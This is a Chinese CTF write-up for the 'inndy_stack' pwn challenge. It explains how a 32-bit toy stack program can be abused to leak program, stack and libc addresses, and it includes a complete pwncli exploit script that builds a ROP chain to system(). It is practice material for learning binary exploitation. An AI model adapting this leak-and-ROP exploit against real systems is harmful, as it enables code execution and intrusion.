---
title: inndy_stack
date: 2022-12-10 13:39:25
tags: [CTF, BUU, PWN, WP]
categories: 
    - CTF
    - BUU
    - Pwn
comment: true
---

# 分析

![](1.png)
- 32位,保护全开

![](2.png)
- 实现了一个简单的栈

![](3.png)
- pop

![](4.png)
- push

# 思路

- v6[0]是当前栈指针（esp），可以通过pop向后移动再push修改使其指向ret addr
- 可以通过pop泄露程序地址、栈地址和libc地址
- 泄露libc地址后ROP

# Exp

``` python
#!/usr/bin/env python3
# Date: 2022-12-08 14:20:13
# Link: https://github.com/RoderickChan/pwncli
# Usage:
#     Debug : python3 exp.py debug elf-file-path -t -b malloc
#     Remote: python3 exp.py remote elf-file-path ip:port

from pwncli import *
cli_script()


io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc

# one_gadgets: list = get_current_one_gadget_from_libc(more=False)
CurrentGadgets.set_find_area(find_in_elf=True, find_in_libc=False, do_initial=False)

def cmd(i, prompt="Cmd >>\n"):
    sla(prompt, i)

def pop():
    cmd('p')

def push(d):
    cmd('i')
    sl(str(d))

pop()
pop()
pop()
ru("Pop -> ")

libc=ELF("../libc/libc-2.23_32.so")
# libc_base-=0x1D5B73

pop()
ru("Pop -> ")
elf_base=int(ru("\n",drop=True))
elf_base-=0x75a
pop()
pop()
ru("Pop -> ")
stack=int(ru("\n",drop=True))
for i in range(6):
    push(0x59)
pop()
ru("Pop -> ")
libc_base=int(ru("\n",drop=True))
libc_base-=0x18637
one=libc_base+0x3a80c
system=libc_base+libc.sym['system']

push(16)
push(16)
push(16)
push(16)
push(system)
push(stack+0x78)
push(libc_base+0x0015902b)
cmd("x")
print(libc_base)
print(hex(elf_base))
ia()

```

![](5.png)